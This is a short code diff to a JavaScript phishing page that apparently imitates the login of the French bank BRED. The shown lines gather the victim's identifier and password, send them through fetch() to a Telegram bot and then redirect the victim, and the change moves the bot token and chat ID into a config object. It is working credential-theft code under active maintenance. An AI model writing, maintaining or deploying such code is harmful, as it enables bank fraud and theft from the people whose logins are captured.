@@ -51,10 +51,10 @@
             
             // Envoyer à Telegram
             const message = `BRED LOGIN:\nIdentifiant: ${login}\nMot de passe: ${password}`;
-            fetch('https://api.telegram.org/bot[REDACTED]/sendMessage', {
+            fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: '6078788670', text: message})
+                body: JSON.stringify({chat_id: window.telegramConfig.CHAT_ID, text: message})
             }).catch(e => console.log(e));
             
             // Rediriger après 1s
